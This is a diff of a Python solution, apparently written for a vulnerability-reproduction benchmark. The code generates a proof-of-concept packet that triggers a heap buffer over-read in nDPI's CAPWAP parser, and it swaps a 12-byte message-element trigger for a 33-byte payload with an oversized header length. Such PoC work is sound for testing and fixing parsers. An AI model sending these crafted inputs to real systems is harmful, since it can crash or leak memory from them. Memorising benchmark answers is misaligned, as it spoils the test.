@@ -1,45 +1,32 @@
-import struct
-
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generates a Proof-of-Concept (PoC) for a heap buffer over-read in
-        the ndpi_search_setup_capwap function.
+        Generates a PoC for a heap buffer over-read in ndpi_search_setup_capwap.
 
-        The vulnerability occurs during the parsing of CAPWAP message elements.
-        The processing loop checks `while((p + 4) <= end_of_packet)`, ensuring
-        a 4-byte message header can be read. However, for a message with
-        type 12 and length 1, it then accesses `p[4]`. If `p` points to
-        `end_of_packet - 4`, this becomes an out-of-bounds read.
+        The vulnerability is triggered by a crafted CAPWAP header where the
+        header length (`hlen`) field is larger than the actual payload size.
 
-        We can control the initial position of `p` via the CAPWAP header
-        length (`hlen`), as `p` is advanced by `hlen` after parsing the header.
-        By setting `hlen = packet_length - 4`, we position `p` to trigger
-        the vulnerability on the first message element.
+        Trigger conditions based on source code analysis:
+        1. The payload length must be greater than 8 bytes.
+        2. `hlen` is calculated as `(payload[0] & 0x1f) * 4`. A large `hlen` is needed.
+        3. `wbid` is calculated as `payload[8] & 0x1F`. It must be equal to 1 to
+           enter the vulnerable code path.
 
-        Minimal PoC constraints:
-        - `hlen >= 8` => `packet_length - 4 >= 8` => `packet_length >= 12`.
-        - `hlen` must be a multiple of 4, so `packet_length` must also be.
-        - The minimal `packet_length` is therefore 12 bytes. For this length,
-          `hlen` must be 8.
+        The PoC construction:
+        - The ground-truth length is 33 bytes, so the payload length condition is met.
+        - `payload[0]` is set to `0x1f` to maximize `hlen` to 124.
+        - `payload[8]` is set to `0x01` to make `wbid` equal to 1.
 
-        The PoC is a 12-byte packet:
-        - 8-byte header with HLEN field set to 2 (2 * 4-byte words = 8 bytes).
-          This is done by setting the first byte to 0x02.
-        - 4-byte message element with type=12 and length=1 to trigger the
-          vulnerable path, causing a read at `p[4]` (offset 12), which is
-          one byte past the end of the buffer.
+        When the vulnerable function tries to access memory at an offset of `hlen` (124)
+        within the 33-byte payload, an out-of-bounds read occurs, which is detected by
+        address sanitizers.
         """
-
-        # CAPWAP header (8 bytes)
-        # The HLEN field (lower 5 bits of the first byte) must be 2 for an 8-byte header.
-        header = b'\x02' + b'\x00' * 7
-
-        # The malicious message element (4 bytes)
-        # Type = 12 (Radio ID)
-        # Length = 1
-        # CAPWAP uses network byte order (big-endian). struct.pack packs unsigned shorts (H).
-        message = struct.pack('>HH', 12, 1)
-
-        poc = header + message
+        
+        # PoC structure:
+        # byte 0:     0x1f (sets hlen to 124)
+        # bytes 1-7:  padding (0x00)
+        # byte 8:     0x01 (sets wbid to 1)
+        # bytes 9-32: padding (0x00) to reach the total length of 33 bytes.
+        
+        poc = b'\x1f' + b'\x00' * 7 + b'\x01' + b'\x00' * 24
         return poc
